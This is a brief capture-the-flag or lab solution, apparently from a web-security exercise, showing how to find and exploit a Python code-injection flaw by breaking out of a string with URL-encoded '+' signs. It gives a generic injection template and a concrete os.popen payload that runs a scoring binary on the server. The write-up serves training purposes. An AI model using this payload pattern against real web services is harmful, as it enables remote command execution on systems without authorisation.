**GOAL**: To finish this exercise, you need to run the binary `/usr/local/bin/score UUID`

# Solution
1. Visiting the web-page and looking at the URL, we dont see any parameter present.
2. We injecting a double-quote `"` and recieve a `internal server error`
3. We now try to put a `."` (dot and a doublw quote) and still get an error message.
4. Now, we try entering a `+` instead of a `.`(dot) and it works.
5. To run a command, we need to enter the following command: 
```
"%2b"<command>"%2b"
```
6. Similarly, we can complete this exercise by entering the following command: 
```
"%2bstr(os.popen("/usr/local/bin/score%20f11a5d9c-353f-40ae-89d6-75392618a2bd").read())%2b"
```
